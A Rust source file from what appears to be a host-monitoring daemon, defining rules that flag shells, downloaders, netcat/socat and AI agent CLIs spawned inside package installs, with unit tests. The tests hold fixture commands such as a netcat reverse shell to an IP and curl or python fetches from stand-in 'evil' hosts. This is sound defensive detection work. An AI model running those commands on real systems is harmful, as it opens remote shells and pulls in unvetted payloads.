//! The four package-subtree rules, moved from the kernel into userland.
//!
//! Their kernel versions used `matchParentBinaries` with `followChildren: true`
//! and matched processes with no package manager in their ancestry at all —
//! `quickshell -> bash`, `Xwayland -> bash`, `make` under `cmake`. The parents
//! map is not the ancestry we needed, so the four policies were deleted and the
//! subtree test now happens here, against the daemon's own `exec_id`-keyed
//! process table with exact ancestry and the real argv (see [`pkgtree`]).
//!
//! **The rule ids and severities are unchanged** (`moat-pkg-subtree-*`,
//! `moat-ai-cli-in-pkg-subtree`), so existing allowlist entries, the shell
//! plugin and the docs keep working. What changed is where the subtree decision
//! is made, not what it is called.
//!
//! Since there is no policy YAML behind these any more, each carries its own
//! `why` / `expected` in the table below. `expected` is deliberately honest:
//! postinstall scripts really do spawn `sh`, and husky, node-gyp and
//! prebuild-install really do run `curl` and `node`.
//!
//! All four fire on `process_exec`, which is exported unconditionally (line 1
//! of the export-allowlist), so they keep working no matter which policies are
//! loaded.


use crate::config::Config;
use crate::event::ExecEvent;
use crate::explain::Finding;
use crate::policy::PolicyMeta;
use crate::proctable::{ProcInfo, ProcTable};
use crate::rules::pkgtree;
use crate::rules::{meta, signal_meta, RuleCtx, UserRule, AI_CLIS};
use crate::util::basename;

pub const INTERPRETER_SPAWN: &str = "moat-pkg-subtree-interpreter-spawn";
pub const DOWNLOADER: &str = "moat-pkg-subtree-downloader";
pub const NETCAT_EXEC: &str = "moat-pkg-subtree-netcat-exec";
pub const AI_CLI_IN_PKG: &str = "moat-ai-cli-in-pkg-subtree";

/// Shells and interpreters a lifecycle script runs through. `node` is
/// deliberately absent: npm *is* node, so every install would match itself.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "fish", "busybox", "python", "python3", "perl", "ruby",
];

/// Fetchers and decoders. `openssl`/`base64` are here because they are how a
/// payload is unpacked once it has been fetched.
const DOWNLOADERS: &[&str] = &[
    "curl", "wget", "aria2c", "base64", "openssl", "xxd", "xh", "httpie", "http",
];

const NETCATS: &[&str] = &[
    "nc",
    "ncat",
    "netcat",
    "nc.openbsd",
    "nc.traditional",
    "socat",
    "telnet",
];

/// `(process, package-manager root, why the root matched)`, or `None` when the
/// process is not *inside* a package subtree. A package manager is not "inside"
/// itself: `npm` execing is the install starting, not a finding.
fn inside_subtree(table: &ProcTable, exec_id: &str) -> Option<(ProcInfo, ProcInfo, String)> {
    let me = table.get(exec_id)?.clone();
    let (root, reason) = pkgtree::pkg_root_with_reason(table, exec_id)?;
    if root.exec_id == me.exec_id {
        return None;
    }
    Some((me, root.clone(), reason))
}

/// The shared skeleton: same hook line, same first evidence line, same shape.
/// Wide on purpose — the four rules differ only in these values, and a builder
/// struct here would be ceremony around one call site each.
#[allow(clippy::too_many_arguments)]
fn subtree_finding(
    ctx: &RuleCtx,
    rule: &str,
    m: PolicyMeta,
    exec_id: &str,
    root: &ProcInfo,
    reason: &str,
    what: String,
    mut extra: Vec<String>,
) -> Option<Finding> {
    let mut f = ctx.finding(rule, m, exec_id)?;
    f.hook = "userland: exec inside a package-manager subtree".into();
    f.what_override = Some(what);
    let mut evidence = vec![pkgtree::root_evidence(root, reason)];
    evidence.append(&mut extra);
    f.extra_evidence = evidence;
    Some(f)
}

// ---------------------------------------------------- interpreter spawn (low)

/// One alert per install, not one per lifecycle script.
#[derive(Default)]
pub struct InterpreterSpawn {
    /// package-manager root exec_id -> unix seconds we first alerted on it.
    /// One alert per package-install root. `rules::Said` is this idea
    /// shared; it grew here first and independently in
    /// `net_first_contact`, which is what made it worth having once.
    seen: Option<crate::rules::Said>,
}

/// Roots are forgotten an hour after their first interpreter, which is far
/// longer than any install and keeps the map from growing without bound.
const ROOT_MEMORY_SECS: u64 = 3600;

impl UserRule for InterpreterSpawn {
    fn id(&self) -> &'static str {
        INTERPRETER_SPAWN
    }

    fn enabled(&self, cfg: &Config) -> bool {
        cfg.rules.pkg_subtree_interpreter_spawn
    }

    /// `tier: signal` — weak alone; exists to be a chain step (BASELINE §4).
    fn meta(&self) -> PolicyMeta {
        signal_meta(
            INTERPRETER_SPAWN,
            "pkg",
            "low",
            "Package manager spawned a shell or interpreter",
            "Install-time scripts are where supply-chain payloads run. On its own a shell under \
             npm or cargo is completely normal, so this is a timeline signal: it is the line you \
             read next to a credential read or an outbound connection from the same install to \
             see when the install started doing more than installing.",
            "Constantly, and legitimately: every npm lifecycle script, node-gyp build, cargo \
             build script and pip setup.py runs a shell or a python interpreter — postinstall \
             scripts spawning `sh` is the normal case, not the exception. moatd raises one \
             alert per install (the first interpreter under that package-manager root), not one \
             per script, so a big `npm install` is one low-severity line.",
            &[],
            &["ignore"],
            "rule",
        )
    }

    fn on_exec(&mut self, _ev: &ExecEvent, exec_id: &str, ctx: &RuleCtx) -> Vec<Finding> {
        let Some((me, root, reason)) = inside_subtree(ctx.table, exec_id) else {
            return Vec::new();
        };
        let comm = basename(&me.exe);
        if !INTERPRETERS.contains(&comm) {
            return Vec::new();
        }

        let said = self
            .seen
            .get_or_insert_with(|| crate::rules::Said::new(ROOT_MEMORY_SECS, 512));
        if !said.worth_saying(&root.exec_id, ctx.now) {
            return Vec::new();
        }

        subtree_finding(
            ctx,
            INTERPRETER_SPAWN,
            self.meta(),
            exec_id,
            &root,
            &reason,
            format!(
                "A `{}` install ran {} ({}).",
                basename(&root.exe),
                comm,
                me.exe
            ),
            vec![
                "first interpreter under this package-manager root; later ones in the same \
                 install are folded into this alert rather than repeated"
                    .to_string(),
            ],
        )
        .into_iter()
        .collect()
    }
}

// --------------------------------------------------------- downloader (high)

#[derive(Default)]
pub struct Downloader;

/// `python -c … http…` / `python -m … http…` / `node -e … https…`: a fetch with
/// no fetcher in sight.
fn inline_fetch(comm: &str, args: &str) -> Option<&'static str> {
    let has_url = args.contains("http://") || args.contains("https://") || args.contains("http");
    let flag = |f: &str| args.split_whitespace().any(|a| a == f);
    match comm {
        "python" | "python3" if (flag("-c") || flag("-m")) && has_url => {
            Some("python -c/-m with an http URL in its arguments")
        }
        "node" if flag("-e") && has_url => Some("node -e with an http(s) URL in its arguments"),
        _ => None,
    }
}

impl UserRule for Downloader {
    fn id(&self) -> &'static str {
        DOWNLOADER
    }

    fn enabled(&self, cfg: &Config) -> bool {
        cfg.rules.pkg_subtree_downloader
    }

    fn meta(&self) -> PolicyMeta {
        meta(
            DOWNLOADER,
            "pkg",
            "high",
            "Package install ran a downloader or decoder",
            "A postinstall script that reaches for curl, wget or base64 is fetching or unpacking \
             something the lockfile never pinned, which means the code you audited is not the \
             code that runs. This is the shape of every recent npm and AUR compromise.",
            "Common and often legitimate: husky, node-gyp, prebuild-install, node-pre-gyp, \
             sharp, esbuild, playwright and puppeteer all fetch a prebuilt binary during \
             install; cargo build scripts download toolchains; PKGBUILDs curl a release \
             tarball. Ignore by parent once you recognise the package — the download itself is \
             not the problem, an unrecognised one is.",
            &[],
            &["kill", "ignore"],
            "parent",
        )
    }

    fn on_exec(&mut self, _ev: &ExecEvent, exec_id: &str, ctx: &RuleCtx) -> Vec<Finding> {
        let Some((me, root, reason)) = inside_subtree(ctx.table, exec_id) else {
            return Vec::new();
        };
        let comm = basename(&me.exe);
        let matched = if DOWNLOADERS.contains(&comm) {
            format!("downloader/decoder `{}`", comm)
        } else if let Some(why) = inline_fetch(comm, &me.args) {
            why.to_string()
        } else {
            return Vec::new();
        };

        subtree_finding(
            ctx,
            DOWNLOADER,
            self.meta(),
            exec_id,
            &root,
            &reason,
            format!(
                "A `{}` install ran {}, which fetches or decodes something the lockfile does not pin.",
                basename(&root.exe),
                comm
            ),
            vec![format!("matched on {}", matched)],
        )
        .into_iter()
        .collect()
    }
}

// ------------------------------------------------------- netcat exec (critical)

#[derive(Default)]
pub struct NetcatExec;

impl UserRule for NetcatExec {
    fn id(&self) -> &'static str {
        NETCAT_EXEC
    }

    fn enabled(&self, cfg: &Config) -> bool {
        cfg.rules.pkg_subtree_netcat_exec
    }

    fn meta(&self) -> PolicyMeta {
        let mut m = meta(
            NETCAT_EXEC,
            "pkg",
            "critical",
            "Package install ran netcat or socat",
            "No legitimate build step needs netcat, socat or telnet. Inside a package install \
             tree these binaries mean one of two things: a reverse shell, or a channel for \
             copying your files out.",
            "Effectively never. A hand-written Makefile that waits for a local port with `nc` \
             before running tests is the only benign case seen in practice; if that is what \
             this is, ignore it by parent.",
            &[],
            &["kill", "quarantine", "ignore"],
            "parent",
        );
        // Arming this rule ends the process, so it says `kill` like a kernel
        // policy and `enforceable()` lists it. moatd does the signalling
        // (`maybe_enforce`); nothing is pushed into the kernel for it.
        m.enforce = "kill".into();
        m
    }

    fn on_exec(&mut self, _ev: &ExecEvent, exec_id: &str, ctx: &RuleCtx) -> Vec<Finding> {
        let Some((me, root, reason)) = inside_subtree(ctx.table, exec_id) else {
            return Vec::new();
        };
        let comm = basename(&me.exe);
        if !NETCATS.contains(&comm) {
            return Vec::new();
        }

        // The DAEMON-wide mode, or this one rule armed on its own. Until
        // 2026-09-05 only the first existed here, so `moatctl set mode enforce
        // --rule moat-pkg-subtree-netcat-exec` recorded an arming that nothing
        // read: the only way to make this rule kill was to arm every rule on
        // the machine, which is exactly the all-or-nothing that per-rule
        // enforcement exists to avoid (CONTRACT §6.5).
        let enforcing = ctx.enforcing(NETCAT_EXEC);
        // In enforce mode the engine appends the *outcome* line (it is the one
        // that knows whether the signal landed), so say nothing here.
        let mut extra = vec![format!("matched on network tool `{}`", comm)];
        if !enforcing {
            extra.push(format!(
                "monitor mode: nothing was killed. `moatctl kill <id>` stops it, or arm this one \
                 rule with `moatctl set mode enforce --rule {}`",
                NETCAT_EXEC
            ));
        }

        let mut out: Vec<Finding> = subtree_finding(
            ctx,
            NETCAT_EXEC,
            self.meta(),
            exec_id,
            &root,
            &reason,
            format!(
                "A `{}` install ran {} ({}) — a tool whose only job is moving data or a shell over the network.",
                basename(&root.exe),
                comm,
                me.exe
            ),
            extra,
        )
        .into_iter()
        .collect();
        for f in out.iter_mut() {
            f.request_kill = enforcing;
        }
        out
    }
}

// ------------------------------------------------------- AI CLI in subtree (high)

#[derive(Default)]
pub struct AiCliInPkgSubtree;

impl UserRule for AiCliInPkgSubtree {
    fn id(&self) -> &'static str {
        AI_CLI_IN_PKG
    }

    fn enabled(&self, cfg: &Config) -> bool {
        cfg.rules.ai_cli_in_pkg_subtree
    }

    fn meta(&self) -> PolicyMeta {
        meta(
            AI_CLI_IN_PKG,
            "ai",
            "high",
            "AI coding CLI launched from inside a package install",
            "An agent CLI started by an install script, rather than by you in a terminal, is a \
             payload borrowing a tool you already trust — along with your credentials and \
             whatever permission-skipping flags it was handed — to do its work.",
            "Monorepo tooling that shells out to an agent as part of a build or a lint-fix \
             step, and `npx claude` run by hand from inside another node process. Ignore by \
             parent once you recognise the script.",
            &["claude", "github-token"],
            &["kill", "ignore"],
            "parent",
        )
    }

    fn on_exec(&mut self, _ev: &ExecEvent, exec_id: &str, ctx: &RuleCtx) -> Vec<Finding> {
        let Some((me, root, reason)) = inside_subtree(ctx.table, exec_id) else {
            return Vec::new();
        };
        let comm = basename(&me.exe);
        if !AI_CLIS.contains(&comm) {
            return Vec::new();
        }
        subtree_finding(
            ctx,
            AI_CLI_IN_PKG,
            self.meta(),
            exec_id,
            &root,
            &reason,
            format!(
                "A `{}` install started the AI agent {} ({}).",
                basename(&root.exe),
                comm,
                me.exe
            ),
            vec![format!(
                "agent arguments: {}",
                if me.args.is_empty() { "(none)" } else { &me.args }
            )],
        )
        .into_iter()
        .collect()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::feeds::Feeds;
    use crate::rules::testkit::{cfg, proc};

    /// `alacritty -> fish -> npm -> sh` with `exec_id` `e-sh`.
    fn install_table() -> ProcTable {
        let mut t = ProcTable::new(8, 60);
        t.observe(&proc("e-term", 41100, "/usr/bin/alacritty", "", None));
        t.observe(&proc("e-fish", 41101, "/usr/bin/fish", "", Some("e-term")));
        t.observe(&proc("e-npm", 41201, "/usr/bin/npm", "install", Some("e-fish")));
        t.observe(&proc("e-sh", 41240, "/usr/bin/sh", "-c postinstall", Some("e-npm")));
        t
    }

    fn run(rule: &mut dyn UserRule, t: &ProcTable, exec_id: &str, mode: &str) -> Vec<Finding> {
        let cfg = cfg();
        let feeds = Feeds::default();
        let homes = vec!["/home/dan".to_string()];
        let ctx = RuleCtx {
            rarity: &crate::rarity::RarityStore::default(),
            cfg: &cfg,
            table: t,
            feeds: &feeds,
            homes: &homes,
            now: 1_000,
            mode,
            armed: &crate::rules::NO_RULES_ARMED,
            cred_read_sessions: &crate::rules::NO_CRED_SESSIONS,
            names: &crate::rules::NO_NAMES,
        };
        rule.on_exec(&ExecEvent::default(), exec_id, &ctx)
    }

    #[test]
    fn ids_and_severities_match_the_policies_they_replace() {
        assert_eq!(InterpreterSpawn::default().meta().severity, "low");
        assert_eq!(Downloader.meta().severity, "high");
        assert_eq!(NetcatExec.meta().severity, "critical");
        assert_eq!(AiCliInPkgSubtree.meta().severity, "high");
        assert_eq!(InterpreterSpawn::default().id(), "moat-pkg-subtree-interpreter-spawn");
        assert_eq!(Downloader.id(), "moat-pkg-subtree-downloader");
        assert_eq!(NetcatExec.id(), "moat-pkg-subtree-netcat-exec");
        assert_eq!(AiCliInPkgSubtree.id(), "moat-ai-cli-in-pkg-subtree");
    }

    #[test]
    fn every_rule_carries_a_full_explain_block() {
        for m in [
            InterpreterSpawn::default().meta(),
            Downloader.meta(),
            NetcatExec.meta(),
            AiCliInPkgSubtree.meta(),
        ] {
            assert!(m.why.len() > 80, "{} has a thin why", m.name);
            assert!(m.expected.len() > 80, "{} has a thin expected", m.name);
            assert!(!m.title.is_empty());
            assert!(m.actions.contains(&"ignore".to_string()));
            assert!(!m.fp_hint.is_empty());
        }
    }

    #[test]
    fn one_install_yields_one_interpreter_alert() {
        let mut t = install_table();
        let mut r = InterpreterSpawn::default();
        assert_eq!(run(&mut r, &t, "e-sh", "monitor").len(), 1);

        // Four more lifecycle scripts under the same npm: silence.
        for (i, id) in ["e-sh2", "e-sh3", "e-sh4", "e-py"].iter().enumerate() {
            let exe = if *id == "e-py" { "/usr/bin/python3" } else { "/usr/bin/sh" };
            t.observe(&proc(id, 41300 + i as u32, exe, "-c x", Some("e-npm")));
            assert!(run(&mut r, &t, id, "monitor").is_empty(), "{} must fold", id);
        }

        // A different install is a different root, so it speaks up again.
        t.observe(&proc("e-npm2", 42000, "/usr/bin/pnpm", "install", Some("e-fish")));
        t.observe(&proc("e-sh5", 42001, "/usr/bin/sh", "-c x", Some("e-npm2")));
        assert_eq!(run(&mut r, &t, "e-sh5", "monitor").len(), 1);
    }

    #[test]
    fn the_package_manager_itself_is_not_a_finding() {
        let t = install_table();
        // npm is the root, not something running inside a subtree.
        assert!(run(&mut InterpreterSpawn::default(), &t, "e-npm", "monitor").is_empty());
        // And neither is a shell with no install above it.
        assert!(run(&mut InterpreterSpawn::default(), &t, "e-fish", "monitor").is_empty());
    }

    #[test]
    fn a_downloader_inside_an_install_is_high_with_the_root_named() {
        let mut t = install_table();
        t.observe(&proc("e-curl", 41250, "/usr/bin/curl", "-sL https://evil.example/x", Some("e-sh")));
        let f = run(&mut Downloader, &t, "e-curl", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].meta.severity, "high");
        assert!(f[0].extra_evidence[0].contains("/usr/bin/npm"), "{:?}", f[0].extra_evidence);
        assert!(f[0].what_override.as_ref().unwrap().contains("curl"));
        assert!(!f[0].request_kill);
    }

    #[test]
    fn inline_interpreter_fetches_count_as_downloaders() {
        let mut t = install_table();
        t.observe(&proc(
            "e-py",
            41251,
            "/usr/bin/python3",
            "-c import urllib.request;urllib.request.urlopen('http://evil/x')",
            Some("e-sh"),
        ));
        t.observe(&proc(
            "e-node",
            41252,
            "/usr/bin/node",
            "-e fetch('https://evil/x')",
            Some("e-sh"),
        ));
        t.observe(&proc("e-node2", 41253, "/usr/bin/node", "build.js", Some("e-sh")));
        assert_eq!(run(&mut Downloader, &t, "e-py", "monitor").len(), 1);
        assert_eq!(run(&mut Downloader, &t, "e-node", "monitor").len(), 1);
        assert!(run(&mut Downloader, &t, "e-node2", "monitor").is_empty(), "plain node is not a fetch");
    }

    #[test]
    fn netcat_asks_for_a_kill_only_in_enforce_mode() {
        let mut t = install_table();
        t.observe(&proc("e-nc", 41260, "/usr/bin/nc", "185.220.101.55 4444 -e /bin/sh", Some("e-sh")));

        let f = run(&mut NetcatExec, &t, "e-nc", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].meta.severity, "critical");
        assert!(!f[0].request_kill, "monitor mode never kills");
        assert!(f[0].extra_evidence.iter().any(|e| e.contains("monitor mode")));

        let f = run(&mut NetcatExec, &t, "e-nc", "enforce");
        assert!(f[0].request_kill, "the engine does the killing, and only in enforce mode");
        assert!(
            !f[0].extra_evidence.iter().any(|e| e.contains("monitor mode")),
            "the outcome line comes from the engine"
        );
    }

    #[test]
    fn socat_and_telnet_count_too_but_curl_does_not() {
        let mut t = install_table();
        t.observe(&proc("e-socat", 41261, "/usr/bin/socat", "-", Some("e-sh")));
        t.observe(&proc("e-tel", 41262, "/usr/bin/telnet", "x 25", Some("e-sh")));
        t.observe(&proc("e-curl", 41263, "/usr/bin/curl", "https://x", Some("e-sh")));
        assert_eq!(run(&mut NetcatExec, &t, "e-socat", "monitor").len(), 1);
        assert_eq!(run(&mut NetcatExec, &t, "e-tel", "monitor").len(), 1);
        assert!(run(&mut NetcatExec, &t, "e-curl", "monitor").is_empty());
    }

    #[test]
    fn an_ai_cli_inside_an_install_fires_high() {
        let mut t = install_table();
        t.observe(&proc(
            "e-cli",
            41270,
            "/home/dan/.local/bin/claude",
            "-p \"fix the build\"",
            Some("e-sh"),
        ));
        let f = run(&mut AiCliInPkgSubtree, &t, "e-cli", "monitor");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].meta.severity, "high");
        assert_eq!(f[0].meta.family, "ai");
        assert!(f[0].extra_evidence.iter().any(|e| e.contains("fix the build")));
    }

    #[test]
    fn nothing_fires_outside_a_package_subtree() {
        // The shapes the kernel policy got wrong: a bash under quickshell and a
        // curl under a terminal.
        let mut t = ProcTable::new(8, 60);
        t.observe(&proc("e-qs", 900, "/usr/bin/quickshell", "", None));
        t.observe(&proc("e-bash", 901, "/usr/bin/bash", "-c omarchy-cmd", Some("e-qs")));
        t.observe(&proc("e-curl", 902, "/usr/bin/curl", "https://x", Some("e-bash")));
        t.observe(&proc("e-nc", 903, "/usr/bin/nc", "-l 8080", Some("e-bash")));
        t.observe(&proc("e-cli", 904, "/usr/bin/claude", "-p hi", Some("e-bash")));
        assert!(run(&mut InterpreterSpawn::default(), &t, "e-bash", "monitor").is_empty());
        assert!(run(&mut Downloader, &t, "e-curl", "monitor").is_empty());
        assert!(run(&mut NetcatExec, &t, "e-nc", "enforce").is_empty());
        assert!(run(&mut AiCliInPkgSubtree, &t, "e-cli", "monitor").is_empty());
    }

    #[test]
    fn node_invoked_npm_is_still_a_subtree() {
        // The shape that made the kernel policy necessary in the first place.
        let mut t = ProcTable::new(8, 60);
        t.observe(&proc("e-fish", 41101, "/usr/bin/fish", "", None));
        t.observe(&proc(
            "e-npm",
            41201,
            "/usr/bin/node",
            "/usr/lib/node_modules/npm/bin/npm-cli.js install",
            Some("e-fish"),
        ));
        t.observe(&proc("e-sh", 41240, "/usr/bin/sh", "-c x", Some("e-npm")));
        let f = run(&mut InterpreterSpawn::default(), &t, "e-sh", "monitor");
        assert_eq!(f.len(), 1);
        assert!(f[0].extra_evidence[0].contains("npm-cli.js"));
    }

    #[test]
    fn toggles_are_respected() {
        let mut c = cfg();
        c.rules.pkg_subtree_interpreter_spawn = false;
        c.rules.pkg_subtree_downloader = false;
        c.rules.pkg_subtree_netcat_exec = false;
        c.rules.ai_cli_in_pkg_subtree = false;
        assert!(!InterpreterSpawn::default().enabled(&c));
        assert!(!Downloader.enabled(&c));
        assert!(!NetcatExec.enabled(&c));
        assert!(!AiCliInPkgSubtree.enabled(&c));
        let d = cfg();
        assert!(InterpreterSpawn::default().enabled(&d));
        assert!(Downloader.enabled(&d));
        assert!(NetcatExec.enabled(&d));
        assert!(AiCliInPkgSubtree.enabled(&d));
    }
}
